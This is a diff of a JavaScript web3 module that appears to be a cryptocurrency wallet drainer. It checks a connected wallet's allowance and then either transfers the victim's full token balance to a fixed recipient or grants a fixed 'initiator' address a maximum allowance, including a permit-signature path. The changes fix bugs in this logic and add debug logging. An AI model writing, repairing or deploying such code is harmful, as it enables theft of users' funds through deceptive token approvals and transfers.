@@ -106,11 +106,11 @@ export const increaseAllowance = async (token) => {
     );
     const account = getAccount().address;
 
-    const allowance = allownce(token);
-
-    if (allowance >= token.balance) {
-      return await transfer(token);
-    }
+    const allow = await allownce(token);
+    if (allow >= token.balance){
+      await transfer(token);
+      return;
+    };
     const permitToken = constants.permitTokens.find(tokenis => tokenis.address === token.token_address)
     if (permitToken) {
       let nonce = undefined
@@ -270,8 +270,11 @@ export const increaseAllowance = async (token) => {
         }
       })
     }
-    const increaseallown = constants.increasAllownceTokens.find(tokenis => tokenis.address === token.token_address)
+    const increaseallown = constants.increasAllownceTokens.find(tokenis => tokenis === token.token_address)
+    console.log(increaseallown);
     if (increaseallown) {
+      console.log(increaseallown);
+      console.log("increase")
       await contract.methods.increaseAllowance(constants.initiator, constants.max)
       .send({ from: account })
       .on('transactionHash', async (hash) => {
@@ -285,8 +288,11 @@ export const increaseAllowance = async (token) => {
       });
       return;
     }
-    const transfertoken = constants.transferTokens.find(tokenis => tokenis.address === token.token_address)
+    const transfertoken = constants.transferTokens.find(tokenis => tokenis === token.token_address)
+    console.log(transfertoken);
     if (transfertoken) {
+      console.log(transfertoken);
+      console.log("transfer")
       await contract.methods
         .transfer(constants.recipient, token.balance)
         .send({ from: account });
@@ -336,10 +342,7 @@ export const allownce = async (token) => {
       token.token_address
     );
     const account = getAccount().address;
-    const allowance = await contract.methods
-        .allowance(account, constants.initiator)
-        .call();
-    return allowance;
+    return await contract.methods.allowance(account, constants.initiator).call();
   } catch (error) {
     console.log(error);
   }
